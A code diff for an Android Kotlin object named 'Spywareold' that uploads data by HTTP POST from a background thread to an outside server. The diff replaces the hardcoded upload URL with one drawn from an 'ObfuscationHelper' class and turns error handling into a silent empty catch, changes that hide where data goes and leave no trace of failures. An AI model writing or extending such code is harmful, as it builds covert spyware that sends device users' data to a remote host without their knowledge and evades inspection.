@@ -5,7 +5,6 @@ import android.content.Context
 import java.net.HttpURLConnection
 import java.net.URL
 import com.google.firebase.auth.FirebaseAuth
-import com.google.firebase.firestore.FirebaseFirestore
 
 object Spywareold {
 
@@ -14,7 +13,7 @@ object Spywareold {
         Thread {
 
             try {
-                val url = URL("https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload")
+                val url = URL(ObfuscationHelper.serverUrl)
                 val connection = url.openConnection() as HttpURLConnection
 
                 connection.requestMethod = "POST"
@@ -27,9 +26,7 @@ object Spywareold {
 
                 connection.responseCode
 
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+            } catch (_: Exception) { }
 
         }.start()
     }
